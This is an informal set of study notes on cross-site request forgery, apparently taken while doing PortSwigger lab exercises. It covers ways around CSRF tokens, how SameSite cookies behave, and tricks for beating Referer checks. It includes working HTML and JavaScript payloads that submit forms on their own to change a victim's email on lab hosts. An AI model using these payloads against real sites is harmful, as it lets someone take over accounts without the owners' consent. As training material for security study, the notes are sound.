### 3 conditons : 

-a relevant action
-cookie based session handling
-no unpredictable request parameters

#### csrf token : 
- sometimes you can remove it 
- change the request  method ( POST => GET)
- get the csrf cookie frome another user 
- if it use doble csrf token,the same thing try get them from another user



### SameSite cookie : 
value : none,lax,strict


lax : if you can change it to get method you can bypasse it. example:

```
`<script>
document.location="https://my-account/change-email?email=hackercsrf%40gmail.com&_method=POST"

</script>`
```

strict : if you try to access to the website from another website you will have not the cookie to access
lax : you will have the cookie but you can not jib kach 3fsa mn 3ndo to your website
none : do anything do you wan

---
#### bypass referer validation : 

- if they check the referer and accept just their own , try to remove the header , if it works , we can using HTML Form to remove the header and ewploit the CSRF .

```<head>
<meta name="referrer" content="no-referrer">
</head>

<form method="POST" action="https://0a25004d04bdab2b80ea039e009f0066.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="hello@hdhhhhdh.cot">
</form>
<script>
        document.forms[0].submit();
</script>``
````````

- if they validate that it need just to contain the old referer ( victim.com ) , we can bypass it just like : 
	Referer: attaker.com/? victim.com ( without space ) .

**javascript role : 

<form method="POST" action="https://0ade003003df4de482db0b7b00db0029.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="ccacca@hello.com">
</form>
```
`<form method="POST" action="https://0ade003003df4de482db0b7b00db0029.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="ccacca@hello.com">
</form>`

<script>
        history.pushState("", "", "/?0ade003003df4de482db0b7b00db0029.web-security-academy.net")
        document.forms[0].submit();
</script>
```

and add this header : **Referrer-Policy: unsafe-url**


---

### CSRF with JSON : 

if they accept content type : **text/plain** , you can do it ( just search about it ) .